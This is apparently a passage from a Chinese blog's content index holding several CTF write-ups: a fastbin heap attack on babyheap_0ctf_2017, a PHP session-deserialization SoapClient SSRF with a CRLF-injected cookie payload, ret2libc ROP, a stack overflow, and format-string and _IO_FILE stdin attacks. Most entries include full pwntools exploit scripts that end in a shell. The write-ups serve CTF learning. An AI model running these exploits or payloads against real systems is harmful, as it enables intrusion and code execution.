*(_DWORD *)(24LL * v2 + a1) = 0;      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;      free(*(void **)(24LL * v2 + a1 + 16));      result = 24LL * v2 + a1;      *(_QWORD *)(result + 16) = 0LL;    &#125;  &#125;  return result;&#125;\n\n正常的show函数\nint __fastcall sub_1051(__int64 a1)&#123;  int result; // eax  int v2; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  result = sub_138C();  v2 = result;  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )  &#123;    result = *(_DWORD *)(24LL * result + a1);    if ( result == 1 )    &#123;      puts(&quot;Content: &quot;);      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));      result = puts(byte_14F1);    &#125;  &#125;  return result;&#125;\n\n利用分析因为前几天才做了off by one所以这道题的第一反应就是修改chunk的size，覆盖掉后面的就好做了。\n首先创建六个chunk\ncreate(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5\n\n然后通过chunk1修改chunk2的size，然后free掉chunk2，那么chunk2此时进入的就是unsorted bin了。\n\n然后又create大小为0x50的chunk那么此时就会切割unsorted bin当中的chunk\n\n此时的main_arena+88也就跑到了chunk3的位置，又因为没有delete掉chunk3所以直接可以泄漏main_arena，然后就是常规拿到__malloc_hook\nshow(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526a\n\n下面就开始用fastbin attack了\nfastbin attack其实这个攻击方式跟tcache的很类似，不过tcache在2.27就是裸奔fastbin还要检测一下size位。\n\n这里有个满足条件的。\n然后就是把chunk弄过来，然后覆盖掉__malloc_hook就好了\nexpfrom pwn import *elf = ELF(&#x27;./babyheap_0ctf_2017&#x27;)r = process(&#x27;babyheap_0ctf_2017&#x27;)# r = remote(&#x27;node4.buuoj.cn&#x27;, 28943)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, size, data):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(data)def delete(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;Command: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x10)  # 0create(0x50)  # 1create(0x50)  # 2create(0x60)  # 3create(0x60)  # 4create(0x10)  # 5edit(1, 0x60, b&#x27;a&#x27;*0x50+p64(0x60)+p64(0x140+1))edit(4, 0x60, b&#x27;a&#x27;*0x50+p64(0x140)+p64(0x20+1))delete(2)create(0x50)  # 2show(3)r.recvuntil(b&#x27;Content: &#x27;)main_arena_88 = u64(r.recv(9)[1:])info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base+0x4526acreate(0x60)  # 6create(0x60)  # 7delete(7)delete(3)delete(4)create(0x60)  # 3edit(3, 0x9, p64(malloc_hook-0x20+5-8))create(0x60)  # 6create(0x60)  # 7create(0x60)  # 8payload = b&#x27;a&#x27;*(0x20-5-8)+p64(one_gadget)info(hex(one_gadget))edit(8, len(payload), payload)# gdb.attach(r)create(1)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["fastbin attack"]},{"title":"bestphp's_revenge","url":"/2021/09/30/bestphp-s-revenge/","content":"这道题真不像看上去那样T_T\n先把源码附上\nindex.php\n&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; \n\nflag.php\nsession_start(); echo &#x27;only localhost can get flag!&#x27;; $flag = &#x27;LCTF&#123;*************************&#125;&#x27;; if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;     $_SESSION[&#x27;flag&#x27;] = $flag; &#125; only localhost can get flag!\n\n\n\n知识点这道题需要的知识点很多\nSoapClient内置类SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。\nhttps://www.anquanke.com/post/id/153065#h2-1\n\n第一个wsdl就是是否开启wsdl后面数组就是请求的一些参数。\n跟去其他wp可以看出来__call方法是可以进行请求达到ssrf的。\n其实我本身还不怎么知道这个东西，下去看一下，不过多介绍\n\nCRLF Injection漏洞CRLF就是指的是’\\r\\n’，在http协议就是根据两个连续的CRLF来分辨header和body的，在这个题当中可以控制user_agent进而控制cookie就行\n\ncall_user_func冷知识总所周知\n\n前面是回调函数，后面是参数。但是还有个冷知识就是\n\n在下面，可以调用类当中的方法。\nsession反序列化session反序列化不陌生，也就是key|反序列化的value，但是也会有其他的保存形式，也是因为用了不同的引擎反序列化的结果\n当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;196082&quot;;\n当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;196082&quot;;&#125;\n当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;196082&quot;;\n也就是当开始使用php_serialize反序列化时(eg:$_SESSION[&#39;name&#39;]=&#39;|196082&#39;)\n结果\na:1:&#123;s:4:&quot;name&quot;;s:7:&quot;|196082&quot;;&#125;\n\n然后再用php引擎去解析这段的时候就被解析成\nkey:a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;value:196082&quot;;&#125;\n\n然而value会被进行反序列化\n再就是php7当中session_start()函数可以接收一个数组参数，然后覆盖掉php.ini当中的配置，在这里可以用来更换引擎\n解题第一步就是将SoapClient反序列化写入到session文件当中\nexp.php\n&lt;?php$payload = new SoapClient(null, array(    &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;,    &#x27;user_agent&#x27; =&gt; &quot;zzz\\r\\nCookie:PHPSESSID=na228cb7qlhrv6tjgb9k45v5e4&quot;,    &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1&#x27;));$payload = serialize($payload);echo &#x27;|&#x27; . urlencode($payload);\n\n这里的PHPSESSID写自己的\n得到payload\n|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A48%3A%22zzz%0D%0ACookie%3APHPSESSID%3Dna228cb7qlhrv6tjgb9k45v5e4%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\n\n\n将f复制成session_start然后POST传参然后覆盖掉php.ini的配置项，让序列化的引擎是php_serialize\n\n返回的数据表示我们写入成功了\n下面就是利用extract进行赋值，让$b=call_user_func这样就行成了array(reset($_SESSION),’welcome_to_the_lctf2018’)，因为并不存在welcome_to_the_lctf2018方法所以直接调用了call\n\n接下来注意上面的call_user_func的图片，其他wp都是说调用了SoapClient类当中的方法，但是我实在想不通，因为即便是上面这串payload被反序列化原本的内置类里面的参数也不受影响(我在这里卡了很久，不知到为什么其他师傅wp说调用了类的方法)，注意那里的题目中的reset函数，他是将指针指向数组第一个元素，这里也就是我们序列化的那串字符串，所以实际上这里调用的是反序列化得到的对象的方法，进行的ssrf\n然后直接在页面刷新\n\n获得flag\n总结，题目质量很高，涵盖了许多知识点，只不过我太菜了，就得地方卡了好久，下去还要好好看看相关内容。\n参考文章:https://www.cnblogs.com/NPFS/p/14335370.html\n","categories":["web-buuctf"],"tags":["session反序列化| php内置类SoapClint| call_user_func| CRLF Injection漏洞"]},{"title":"ciscn_2019_c_1","url":"/2021/09/19/ciscn-2019-c-1/","content":"获取基本信息\n\n然后进入ida进行分析\n分析程序// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\\n&quot;);  begin(&quot;Welcome to this Encryption machine\\n&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin(&quot;I think you can do it by yourself&quot;);    &#125;    if ( v4 == 3 )    &#123;      puts(&quot;Bye!&quot;);      return 0;    &#125;    if ( v4 != 1 )      break;    encrypt();    begin(&quot;%d&quot;);  &#125;  puts(&quot;Something Wrong!&quot;);  return 0;&#125;\n\nint begin()&#123;  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);&#125;\n\nint encrypt()&#123;  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  &#123;    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    &#123;      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      &#123;        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      &#125;      else      &#123;        s[x] ^= 0xEu;      &#125;    &#125;    else    &#123;      s[x] ^= 0xDu;    &#125;    ++x;  &#125;  puts(&quot;Ciphertext&quot;);  return puts(s);&#125;\n\n发现只有encrypt存在栈溢出，所以就选1就好了。然后在encrypt函数里面我们是肯定不想自己的数据被处理，这样就会让辛辛苦苦的payload没了，所以就可以绕过，前面加一个’\\0’。\n发现程序并没有找到system函数和’/bin/sh’字符串，所以只能自己想办法调用了。\n攻击思路通过构造ROP执行puts打印出puts存在的真实地址==&gt;根据puts地址找到对应的libc文件==&gt;在libc文件中找到我们需要的函数和字符串==&gt;计算libc中函数和程序本身函数地址的偏移量==&gt;根据偏移量找到函数getshell\namd64函数的参数放在rdi,rsi,rdx,rcx,r8,r9当中，而i386函数的参数是直接寻址的。所以我们想要构建ROP就必须存在pop rdi;ret\n\n可以找到两个命令的地址为0x400c83。\n最终get_shellexp.py\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;DEBUG&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_c_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 27809)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]pop_rdi_addr = 0x400c83payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(pop_rdi_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.recvuntil(b&#x27;Ciphertext\\n&#x27;)r.recvuntil(b&#x27;\\n&#x27;)real_put_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=False)[:-1].ljust(8, b&#x27;\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, real_put_addr)lib_puts_addr = libc.dump(&#x27;puts&#x27;)lib_system_addr = libc.dump(&#x27;system&#x27;)lib_shell_addr = libc.dump(&#x27;str_bin_sh&#x27;)offset = real_put_addr - lib_puts_addrreal_system_addr = lib_system_addr + offsetreal_shell_addr = lib_shell_addr + offsetret_addr = 0x4006b9payload = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x08 - 1) + p64(ret_addr) + p64(pop_rdi_addr) + \\    p64(real_shell_addr) + p64(real_system_addr)print(&#x27;len-&gt;&#x27;, len(payload))r.recvuntil(b&#x27;Input your choice!\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Input your Plaintext to be encrypted\\n&#x27;)r.sendline(payload)r.interactive()\n\n开始先获取puts在plt表的位置，然后获取puts在got表的位置(got表内部保存的是puts的真实地址)，然后获得程序main函数的地址\npayload1:    b&#x27;\\0&#x27; 用去绕过加密，这个长度为0所以会break掉\t然后填充垃圾字符实现栈溢出    将ret位置地址改为前面我们说的pop_rip;ret    再继续填充栈第一个写上puts参数也就是puts在got表的位置，因为我们要获取got表里面的实际位置    这个plt表用来ret，ret会将pop rip    最后一个就是执行完puts执行main函数payload2：\t有区别的就是p64(ret_addr)这是因为题目环境是ubuntu18所以要考虑到栈平衡\n\n","categories":["pwn-buuctf"],"tags":["ROP| stack overflow"]},{"title":"ciscn_2019_n_1","url":"/2021/09/18/ciscn-2019-n-1/","content":"获取文件基本信息\n\n\n发现是一个64位的程序，然后打开了NX保护(在栈上的内容不可执行)\n程序内容让我们猜数字\n分析程序程序的结构比较简单，直接使用gdb调试(主要是我使用gdb不是特别熟练所以想多用gdb让用起来熟练点)\n\n首先下断点到main函数然后运行程序\n\n然后可以看到会进入到一个函数名为func的函数\nida反汇编的func函数:\nint func()&#123;  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#x27;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;&#125;\n\n\n\n\n是拿\n这个常量和v2作比较，然后这个常量的值为11.28125浮点型数据，无法用p64直接上成payload。但是浮点型在程序的存在形式也是16进制的形式所以在ida中找到这个地址所对应的值就可以拿去生成payload\n最后exp.py:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/ciscn_2019_n_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 28839)payload = b&#x27;a&#x27;*(0x30-0x4) + p64(0x41348000)r.recvuntil(b&quot;Let&#x27;s guess the number.\\n&quot;)r.sendline(payload)r.interactive()\n\n","categories":["pwn-buuctf"],"tags":["pwn"]},{"title":"easyfmt","url":"/2021/12/17/easyfmt/","content":"朝着今年更到50篇进发！！！\n检查保护\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[264]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(&quot;welcome to haerbin~&quot;);  if ( (unsigned int)CheckIn(&quot;welcome to haerbin~&quot;) == 1 )  &#123;    memset(buf, 0, 0x100uLL);    write(1, &quot;slogan: &quot;, 9uLL);    read(0, buf, 0x100uLL);    printf(buf);  &#125;  puts(&quot;bye~&quot;);  exit(0);&#125;\n\n_BOOL8 CheckIn()&#123;  unsigned int v0; // eax  unsigned __int8 v2; // [rsp+0h] [rbp-30h]  __int64 buf; // [rsp+10h] [rbp-20h] BYREF  __int16 v4; // [rsp+18h] [rbp-18h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v0 = time(0LL);  srand(v0);  v2 = rand() % 5 + 48;  printf(&quot;enter:&quot;);  buf = 0LL;  v4 = 0;  read(0, &amp;buf, 0xAuLL);  return (_BYTE)buf == v2;&#125;\n\n流程分析可以看到程序是进入CheckIn函数，跟随机数比较，但是这里rand()%5的大小为0~4，所以直接爆破就好。然后爆破成功之后会进入到格式化字符串漏洞，但是程序会直接exit结束。\n利用分析通过爆破进入格式化字符串漏洞，修改exit的got表到0x400982位置(可以重复利用格式化字符串)，泄漏出libc的基地址，修改printf函数的got表地址为system地址。\n重点是需要重复利用格式化字符串漏洞，所以修改了exit的got表后面直接泄漏和修改就好了。\n需要注意的是https://cv196082.gitee.io/2021/09/17/study-pwn1/ 在我的这篇文章里面说了got表的地址是怎么来的，因为exit是最后才执行所以exit的got表存的不是他的真是地址\n\n存放的是这个，所以我们直接修改低两位就可以了。\n在就是修改printf的地址为system地址的时候只需要覆盖后面三个字节也可以了。\nexpfrom pwn import *from LibcSearcher import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]printf_addr = 0x400982while 1:    elf = ELF(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    r = process(&#x27;./6b9d293690ae46709747b195c78833ff&#x27;)    # r = remote(&#x27;111.200.241.244&#x27;, 54807)    try:        r.recvuntil(b&#x27;enter:&#x27;)        r.sendline(b&#x27;2&#x27;)        r.recvuntil(b&#x27;slogan:&#x27;)        break    except:        continue# gdb.attach(r)# offset=8context.log_level = &#x27;debug&#x27;exit_got = elf.got[&#x27;exit&#x27;]printf_got = elf.got[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]# 修改exit的got表地址payload = b&#x27;%&#x27;+bytes(str(0x982), encoding=&#x27;utf8&#x27;) + b&#x27;c%10$hn&#x27;payload = payload.ljust(0x10, b&#x27;a&#x27;)payload += p64(exit_got)# gdb.attach(r)r.sendline(payload)# 泄漏exit的真实地址r.recvuntil(b&#x27;slogan: &#x27;)payload = b&#x27;%10$s&#x27;.ljust(8, b&#x27;a&#x27;)+p64(read_got)# gdb.attach(r)r.sendline(payload)read_addr = u64(r.recvuntil(b&#x27;aaa&#x27;, drop=True)[1:].ljust(8, b&#x27;\\x00&#x27;))info(hex(read_addr))libc = LibcSearcher(&#x27;read&#x27;, read_addr)libc_base = read_addr-libc.dump(&#x27;read&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)# 修改printf的地址r.recvuntil(b&#x27;slogan: &#x27;)system_low = system_addr &amp; 0xffpayload = b&#x27;%&#x27;+bytes(str(system_low), encoding=&#x27;utf8&#x27;)+b&#x27;c%14$hhn&#x27;system_high = ((system_addr &amp; 0xffffff) &gt;&gt; 8) - system_lowpayload += b&#x27;%&#x27;+bytes(str(system_high), encoding=&#x27;utf8&#x27;)+b&#x27;c%15$hn&#x27;payload = payload.ljust(0x20, b&#x27;a&#x27;)+p64(printf_got)+p64(printf_got+1)r.sendline(payload)# getshellr.recvuntil(b&#x27;slogan: &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["格式化字符串"]},{"title":"echo_back","url":"/2021/12/06/echo-back/","content":"保护检查\n保护全开\n流程分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 result; // rax  int v4; // [rsp+8h] [rbp-18h]  char s[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  sub_A10(a1, a2, a3);  alarm(0x3Cu);  sub_A53();  v4 = 0;  memset(s, 0, sizeof(s));  while ( 1 )  &#123;    while ( 1 )    &#123;      result = menu();      if ( result != 2 )        break;      printf_vuln(s);    &#125;    if ( result == 3 )      break;    if ( result == 1 &amp;&amp; !v4 )    &#123;      set_name(s);      v4 = 1;    &#125;  &#125;  return result;&#125;\n\nssize_t __fastcall set_name(void *a1)&#123;  printf(&quot;name:&quot;);  return read(0, a1, 7uLL);&#125;\n\nunsigned __int64 __fastcall printf_vuln(const char *a1)&#123;  size_t nbytes; // [rsp+1Ch] [rbp-14h] BYREF  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  memset(&amp;nbytes + 4, 0, sizeof(size_t));  printf(&quot;length:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  getchar();  if ( (nbytes &amp; 0x80000000) != 0LL || nbytes &gt; 6 )    LODWORD(nbytes) = 7;  read(0, &amp;nbytes + 4, nbytes);  if ( *a1 )    printf(&quot;%s say:&quot;, a1);  else    printf(&quot;anonymous say:&quot;);  printf(&amp;nbytes + 4);  return __readfsqword(0x28u) ^ v3;&#125;\n\n整体流程就是你先设置名字然后说一句话\n漏洞分析漏洞点在printf_vuln函数里面，存在很明显的格式化字符串的漏洞\n\n在里面存在几处可以利用的信息(我这是manjaro所以__libc_start_main的地址有区别，但是不影响，后续还是要用ubuntu调试)，目前就是我们可以泄漏libc地址，可以泄漏程序地址。\n但是问题是我们输入的内容只能是七个字符，所以需要攻击scanf。\n_IO_FIELtypedef struct _IO_FILE FILE;   /* Standard streams.  */  extern struct _IO_FILE *stdin;      /* Standard input stream.  */  extern struct _IO_FILE *stdout;     /* Standard output stream.  */  extern struct _IO_FILE *stderr;     /* Standard error output stream.  */  #ifdef __STDC__  /* C89/C99 say they&#x27;re macros.  Make them happy.  */  #define stdin stdin  #define stdout stdout  #define stderr stderr  #endif \n\n_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;  _IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;  _IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; \n\n可以看出存在三个文件指针\n文件读取过程:_IO_new_file_underflow这个函数调用_IO_SYSREAD这个函数来实现的\nint _IO_new_file_underflow (_IO_FILE *fp)&#123;  _IO_ssize_t count;  ...  if (fp-&gt;_flags &amp; _IO_NO_READS)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  ## 如果输入缓冲区里存在数据，则直接返回  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    return *(unsigned char *) fp-&gt;_IO_read_ptr;  ...  if (fp-&gt;_IO_buf_base == NULL)    &#123;      ...      _IO_doallocbuf (fp);    &#125;  ...  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end    = fp-&gt;_IO_buf_base;  ##调用_IO_SYSREAD函数最终执行系统调用读取数据  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  ...  ## 设置结构体指针  fp-&gt;_IO_read_end += count;  ...  return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125;libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n\n\n再就是_IO_FILE这个结构。结合上面的函数可以看出来，_IO_SYSREAD函数是将数据写到_IO_buf_base这个位置，大小是_IO_buf_end-_IO_buf_end。\n\n可以看到这个_IO_2_1_stdin_的地址为0x7f680bbe48e0\n虽然我们格式化字符串想要直接修改到我们想要的地方是不得行的，但是我们可以将_IO_buf_base的内容的最后一个字节删去，这样地址就变成了0x7f680bbe4900计算一下发现到了_IO_write_base的地址，我就可以进一步修改这个结构内部的数据了。\n我们该怎么去删除_IO_buf_base最后一个字节呢？题目还给了一个setname函数，这个函数我们写入的参数也是存在在栈上的，所以一样可以使用格式化字符串，但是只允许有七个字节，但是一般地址都存在有\\x00位，又因为是小端序，所以直接写入就好。\nexpfrom pwn import *# from LibcSearcher import *elf = ELF(&#x27;./echo_back&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./echo_back&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 63836)# context.log_level = &#x27;debug&#x27;_IO_2_1_stdin_ = libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]def printf_vuln(content):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;8&#x27;)    r.send(content)def setName(name):    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.send(name)def exit():    r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)printf_vuln(b&#x27;%19$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)libc_start_main = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)-0xf0print(libc_start_main)libc_base = libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))_IO_2_1_stdin_addr = libc_base+_IO_2_1_stdin__IO_buf_addr = _IO_2_1_stdin_addr+0x8*7print(&quot;_IO_buf_addr:&quot;, hex(_IO_buf_addr))print(&quot;_IO_2_1_stdin_addr:&quot;, hex(_IO_2_1_stdin_addr))printf_vuln(b&#x27;%13$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_ret_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)elf_base = main_ret_addr-0xd08print(elf_base)pop_rdi_addr = 0x0000000000000d93+elf_baseprintf_vuln(b&#x27;%12$p&#x27;)r.recvuntil(b&#x27;anonymous say:&#x27;)main_rbp_addr = int(r.recvuntil(    b&#x27;-----------menu-----------&#x27;, drop=True)[2:], 16)print(main_rbp_addr)setName(p64(_IO_buf_addr))printf_vuln(b&#x27;%16$hhn&#x27;)# gdb.attach(r)payload = p64(_IO_2_1_stdin_addr+0x83)*3 + \\    p64(main_rbp_addr+8)+p64(main_rbp_addr+8+8*3)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)for i in range(0, len(payload)-1):    print(i)    r.recvuntil(b&#x27;choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;length:&#x27;)    r.sendline(b&#x27;&#x27;)    # gdb.attach(r)payload = p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)r.recvuntil(b&#x27;choice&gt;&gt; &#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;length:&#x27;)r.send(payload)r.sendline(b&#x27;&#x27;)# gdb.attach(r)exit()r.interactive()\n\nexp中的循环是因为这条源代码\nif (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  return *(unsigned char *) fp-&gt;_IO_read_ptr;\n\n我没在修改结构体就会执行\nfp-&gt;_IO_read_end += count;\n\n所以需要绕过这条if语句\n在getchar内部有这样一条语句，所以循环绕过就行\nfp-&gt;_IO_read_end++\n\n\n\n\n\n参考博客:\nhttps://blog.csdn.net/weixin_44145820/article/details/104629998\nhttps://blog.csdn.net/seaaseesa/article/details/103114909\n","categories":["pwn-xctf"],"tags":["_IO_FILE"]},{"title":"forgot","url":"/2021/10/18/forgot/","content":"检查程序\n32位，只开了栈不可执行的保护。\n反汇编int __cdecl main()&#123;  size_t v0; // ebx  char v2[32]; // [esp+10h] [ebp-74h] BYREF  _DWORD v3[10]; // [esp+30h] [ebp-54h]  char s[32]; // [esp+58h] [ebp-2Ch] BYREF  int v5; // [esp+78h] [ebp-Ch]  size_t i; // [esp+7Ch] [ebp-8h]  v5 = 1;  v3[0] = sub_8048604;  v3[1] = sub_8048618;  v3[2] = sub_804862C;  v3[3] = sub_8048640;  v3[4] = sub_8048654;  v3[5] = sub_8048668;  v3[6] = sub_804867C;  v3[7] = sub_8048690;  v3[8] = 